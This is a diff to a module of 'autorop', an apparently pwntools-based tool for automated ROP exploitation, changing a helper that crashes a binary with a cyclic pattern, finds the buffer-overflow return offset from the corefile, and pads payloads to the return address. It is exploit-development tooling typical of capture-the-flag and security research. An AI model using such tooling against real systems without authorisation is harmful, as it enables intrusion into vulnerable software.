@@ -1,4 +1,4 @@
-from autorop import PwnState
+from autorop import PwnState, constants
 from pwn import tube, process, cyclic, cyclic_find, log, pack
 
 
@@ -25,17 +25,23 @@ def corefile(state: PwnState) -> PwnState:
 
             - ``bof_ret_offset``: Updated if it was not set before.
             - ``overwriter``: Now calls the previous ``overwriter`` but with
-              ``bof_ret_offset`` padding bytes prepended to the data given.
+              ``bof_ret_offset`` padding bytes prepended to the data given,
+              and reading the same number of lines as were observed
+              at the crash.
     """
     #: Number of bytes to send to attempt to trigger a segfault
     #: for corefile generation.
     CYCLIC_SIZE = 1024
 
+    output_lines_after_input = 0
+
     if state.bof_ret_offset is None:
         # cause crash and find offset via corefile
         p: tube = process(state.binary_name)
+        p.clean(constants.CLEAN_TIME)
         state.overwriter(p, cyclic(CYCLIC_SIZE))
         p.wait()
+        output_lines_after_input = p.recvall().count(b"\n")
         fault: int = p.corefile.fault_addr
         log.info("Fault address @ " + hex(fault))
         state.bof_ret_offset = cyclic_find(pack(fault))
@@ -47,8 +53,12 @@ def corefile(state: PwnState) -> PwnState:
     old_overwriter = state.overwriter
 
     # define overwriter as expected - to write data starting at return address
+    # it will also automatically handle reading output which was printed
+    # so as not to require manual intervention for silencing generic output
     def overwriter(t: tube, data: bytes) -> None:
         old_overwriter(t, cyclic(state.bof_ret_offset) + data)
+        for _ in range(output_lines_after_input):
+            t.recvline()
 
     state.overwriter = overwriter
 
